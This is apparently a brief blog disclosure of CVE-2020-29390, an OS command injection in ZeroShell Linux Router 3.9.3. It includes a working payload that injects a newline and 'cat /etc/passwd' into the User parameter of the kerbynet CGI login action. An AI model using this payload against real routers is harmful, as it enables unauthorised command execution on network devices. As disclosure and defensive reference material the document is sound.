---
title: ZeroShell Linux Router 3.9.3 OS Command Injection vulnerability(CVE-2020-29390)
author: cotes
date: 2020-08-09 12:13:00 +0800
categories: [vulnerability, ZeroShell]
tags: []
pin: false
math: true
mermaid: true
image:
  path: /assets/img/zeroshell_linux_router_rce/1606639649.png
---


Vendor:
-------


Zeroshell Linux Router


https://zeroshell.org/


Product:
--------

ZeroShell-3.9.3-X86.iso

https://zeroshell.org/download/


>
> Zeroshell is a Linux based distribution dedicated to the implementation of Router and Firewall Appliances completely administrable via web interface. > Zeroshell is available for x86/x86-64 platforms and ARM based devices such as Raspberry Pi.
>
>
>

OS Command Injection
--------------------

When I reviewed the earlier vulnerabilities in zeroshell, I discovered that an OS Command Injection vulnerability still exists in its latest version.
You can download [here](https://zeroshell.org/download/).

![](/assets/img/zeroshell_linux_router_rce/1606639186.png)

Payload: `/cgi-bin/kerbynet?Action=StartSessionSubmit&User='%0acat /etc/passwd%0a'&PW=`

![](/assets/img/zeroshell_linux_router_rce/1606639649.png)

Reference
=========
* [Zeroshell 3.6.0/3.7.0 Net Services - Remote Code Execution](https://www.exploit-db.com/exploits/41040)
* https://cwe.mitre.org/data/definitions/78.html


